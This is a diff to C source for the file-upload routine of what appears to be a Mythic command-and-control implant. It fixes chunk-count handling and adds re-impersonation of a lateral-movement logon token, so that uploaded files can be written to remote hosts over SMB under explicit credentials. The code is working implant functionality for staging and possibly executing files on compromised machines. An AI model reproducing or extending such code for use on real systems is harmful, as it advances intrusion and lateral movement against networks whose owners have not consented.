@@ -68,18 +68,55 @@ BOOL UploadSync(_In_ PCHAR TaskUuid, _Inout_ PPARSER Response)
 
         if ( strcmp(Current->TaskUuid, TaskUuid) == 0 )
         {
-            /* Update Upload State */
+            /* Cache total chunk count — only update when Mythic provides a
+             * non-zero value; a zero means the field was absent in the response
+             * and we should keep using the previously received value. */
+            if (TotalChunks > 0)
+                Current->totalChunks = TotalChunks;
+            else
+                TotalChunks = Current->totalChunks;   /* use cached */
+
             Current->currentChunk = CurrentChunk;
-            Current->totalChunks  = TotalChunks;
 
             /* Write chunk if there is data */
             if (bytesRead > 0)
             {
                 DWORD bytesWritten = 0;
 
-                if ( !WriteFile(Current->hFile, ChunkBuf, (DWORD)bytesRead, &bytesWritten, NULL) )
+                /* Re-impersonate for lateral-movement uploads that used explicit
+                 * credentials: the file handle was opened under that token and
+                 * some SMB configurations require the same identity for writes. */
+                BOOL wasImpersonated = FALSE;
+                if (Current->LmLogonToken)
+                    wasImpersonated = ImpersonateLoggedOnUser(Current->LmLogonToken);
+
+                BOOL writeOk = WriteFile(Current->hFile, ChunkBuf, (DWORD)bytesRead, &bytesWritten, NULL);
+                DWORD writeErr = GetLastError();
+
+                if (wasImpersonated)
+                    RevertToSelf();
+
+                if ( !writeOk )
                 {
-                    _err("Failed to write chunk to file. ERROR CODE: %d", GetLastError());
+                    _err("Failed to write chunk %d to file. ERROR CODE: %d", CurrentChunk, writeErr);
+
+                    /* Close the partial file and report failure — the upload
+                     * cannot continue; let the operator retry. */
+                    if (Current->hFile && Current->hFile != INVALID_HANDLE_VALUE)
+                    {
+                        CloseHandle(Current->hFile);
+                        Current->hFile = INVALID_HANDLE_VALUE;
+                    }
+
+                    PackageError(Current->TaskUuid, writeErr);
+
+                    /* Unlink and free */
+                    if (Prev)
+                        Prev->Next = Next;
+                    else
+                        xenonConfig->UploadQueue = Next;
+
+                    UploadFree(Current);
                     return FALSE;
                 }
 
@@ -90,8 +127,11 @@ BOOL UploadSync(_In_ PCHAR TaskUuid, _Inout_ PPARSER Response)
                 PackageUpdate(Current->TaskUuid, Pkg);
             }
 
-            /* Last chunk → finalize upload */
-            if (CurrentChunk >= TotalChunks)
+            /* Last chunk → finalize upload only when we have a valid total and
+             * every chunk up to TotalChunks has been received.
+             * Guard: TotalChunks == 0 means Mythic never told us the total — do
+             * not try to execute or delete until we have that confirmation. */
+            if (TotalChunks > 0 && CurrentChunk >= TotalChunks)
             {
                 _dbg("Upload complete. %d / %d chunks", CurrentChunk, TotalChunks);
 
